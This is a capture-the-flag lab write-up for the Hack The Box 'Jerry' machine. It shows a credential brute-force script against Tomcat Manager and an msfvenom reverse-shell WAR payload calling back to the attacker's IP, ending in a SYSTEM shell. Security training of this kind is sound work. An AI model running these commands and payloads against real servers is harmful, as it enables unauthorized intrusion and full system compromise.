# HTB: Jerry — Writeup

**Target IP:** 10.129.54.89
**Attacker (Kali) IP:** 10.10.15.146

---

## 1. Reconnaissance

### 1.1 Port Scanning (RustScan)

```
┌──(root㉿kali)-[/home/kali/jerry]
└─# rustscan -a 10.129.54.89
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
RustScan: Because guessing isn't hacking.

Open 10.129.54.89:8080

PORT     STATE SERVICE    REASON
8080/tcp open  http-proxy syn-ack ttl 127

Nmap done: 1 IP address (1 host up) scanned in 2.94 seconds
```

Only a single open port: **8080**. Visiting it in a browser identified **Apache Tomcat 7.0.88**.

---

## 2. Tomcat Manager — Default Credential Brute-Force

### 2.1 The Manager App Requires Auth

Browsing to `/manager/html` returned a Basic Auth prompt. Rather than guess manually, credentials were tested against a known Tomcat default-credential list ([netbiosX/Default-Credentials](https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown)).

### 2.2 Automated Credential Check

```
┌──(root㉿kali)-[/home/kali/jerry]
└─# cat script.sh     
#!/bin/bash
# Loop through each credential, base64 encode, and test

while IFS= read -r cred; do
    # Skip empty lines
    [ -z "$cred" ] && continue
    
    # Base64 encode the credentials
    encoded=$(echo -n "$cred" | base64)
    
    echo -n "Testing $cred... "
    
    # Make the request with Basic Auth header
    response=$(curl -s -o /dev/null -w "%{http_code}" \
        -H "Authorization: Basic $encoded" \
        http://10.129.54.89:8080/manager/html)
    
    if [ "$response" -eq 200 ]; then
        echo "[+] SUCCESS! Credentials: $cred"
        echo "Base64: $encoded"
        break
    elif [ "$response" -eq 403 ]; then
        echo "[!] 403 Forbidden"
    else
        echo "[x] $response"
    fi
done < creds
```

A simple loop: for each candidate `user:pass` pair in the list, Base64-encode it, send it as a `Basic` Authorization header against `/manager/html`, and report whether the response was `200` (success), `403` (valid-looking but forbidden), or something else (failure).

### 2.3 Running It

```
┌──(root㉿kali)-[/home/kali/jerry]
└─# ./script.sh   
Testing admin:password... [x] 401
Testing admin:... [x] 401
Testing admin:Password1... [x] 401
Testing admin:password1... [x] 401
Testing admin:admin... [!] 403 Forbidden
Testing admin:tomcat... [x] 401
Testing both:tomcat... [x] 401
Testing manager:manager... [x] 401
Testing role1:role1... [x] 401
Testing role1:tomcat... [x] 401
Testing role:changethis... [x] 401
Testing root:Password1... [x] 401
Testing root:changethis... [x] 401
Testing root:password... [x] 401
Testing root:password1... [x] 401
Testing root:r00t... [x] 401
Testing root:root... [x] 401
Testing root:toor... [x] 401
Testing tomcat:tomcat... [x] 401
Testing tomcat:s3cret... [+] SUCCESS! Credentials: tomcat:s3cret
Base64: dG9tY2F0OnMzY3JldA==
```

**Cracked: `tomcat` / `s3cret`**

### 2.4 Confirming Manager Access

```
┌──(root㉿kali)-[/home/kali/jerry]
└─# curl -v -H "Authorization: Basic dG9tY2F0OnMzY3JldA==" http://10.129.54.89:8080/manager/html
*   Trying 10.129.54.89:8080...
* Established connection to 10.129.54.89 (10.129.54.89 port 8080) from 10.10.15.146 port 34932 
> GET /manager/html HTTP/1.1
> Authorization: Basic dG9tY2F0OnMzY3JldA==
> 
< HTTP/1.1 200 OK
< Server: Apache-Coyote/1.1
< Set-Cookie: JSESSIONID=317AE817469B4D400EFBBB827093ACDB; Path=/manager; HttpOnly
< Content-Type: text/html;charset=utf-8
```

`200 OK` — full access to the Tomcat Manager web interface, which includes a **WAR file deploy/upload** feature.

---

## 3. Exploitation — Malicious WAR Upload → SYSTEM Shell

### 3.1 Building a Payload WAR (msfvenom)

```
┌──(root㉿kali)-[/home/kali/jerry]
└─# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.15.146 LPORT=443 -f war > rev_shell.war  
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of war file: 2436 bytes
```

```
┌──(root㉿kali)-[/home/kali/jerry]
└─# jar -ft rev_shell.war 
META-INF/
META-INF/MANIFEST.MF
WEB-INF/
WEB-INF/web.xml
lwmffhnk.jsp
```

The generated WAR bundles a randomly-named JSP (`lwmffhnk.jsp`) that triggers a Windows reverse shell payload when requested.

### 3.2 Deploying via the Manager App

Uploaded `rev_shell.war` through the Tomcat Manager's WAR deployment field using the `tomcat:s3cret` credentials. Tomcat auto-deployed it under the context path `/rev_shell`.

### 3.3 Triggering the Shell

Started a listener, then requested the deployed JSP to execute the payload:

```
┌──(root㉿kali)-[/home/kali/jerry]
└─# curl http://10.129.54.89:8080/rev_shell/lwmffhnk.jsp
```

```
┌──(root㉿kali)-[/home/kali/jerry]
└─# rlwrap nc -lvnp 443                          
listening on [any] 443 ...
connect to [10.10.15.146] from (UNKNOWN) [10.129.54.89] 49192
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\apache-tomcat-7.0.88>whoami
whoami
nt authority\system
```

**Immediate SYSTEM access** — Tomcat was running as the highest-privileged local account, so exploiting the Manager app skipped straight past any user→root escalation step entirely.

---

## 4. Summary / Attack Chain

1. **Recon**: RustScan/Nmap → a single exposed port, 8080, running **Apache Tomcat 7.0.88**.
2. **Credential brute-force**: The Tomcat Manager (`/manager/html`) was reachable but required auth; a small automated script tested a public list of default Tomcat credentials and found a working pair — **`tomcat:s3cret`**.
3. **Exploitation**: With Manager access confirmed, generated a malicious **WAR** payload with msfvenom (`windows/shell_reverse_tcp`), deployed it through the Manager's upload feature, and triggered the embedded JSP.
4. **Result**: The reverse shell connected back running as **`nt authority\system`** — full SYSTEM compromise achieved directly through the initial foothold, since the Tomcat service itself ran with SYSTEM privileges.

### Key Vulnerabilities Chained
- Apache Tomcat Manager application exposed and reachable without IP restriction
- Weak, non-default-but-guessable Tomcat Manager credentials (`tomcat:s3cret`), crackable via a small default-credential wordlist
- Tomcat Manager's WAR-deploy feature allowing arbitrary code execution by design for authenticated users, with no separation of privilege — combined with the Tomcat service running as `NT AUTHORITY\SYSTEM` rather than a lower-privileged service account
